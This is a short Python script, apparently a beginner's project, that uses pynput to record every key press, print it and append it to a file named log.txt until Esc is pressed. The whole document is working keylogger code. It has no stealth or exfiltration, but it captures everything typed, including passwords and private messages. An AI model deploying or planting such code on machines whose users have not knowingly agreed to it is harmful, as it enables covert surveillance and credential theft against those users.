from pynput import keyboard

def on_press(key):
    key = str(key)

    if key == "Key.space":
        key = " "
    
    if key == "Key.enter":
        key = '\n'

    if key == "Key.tab":
        key = "    "

    #print(key)
    new_key = key.replace("'", "").replace('Key.', '')
    print(new_key)

    with open("log.txt", "a") as file:
         file.write(new_key)



def on_release(key):
    if key == keyboard.Key.esc:
# stop listening!
        return False

with keyboard.Listener(on_press = on_press, on_release = on_release) as Listener:
    Listener.join()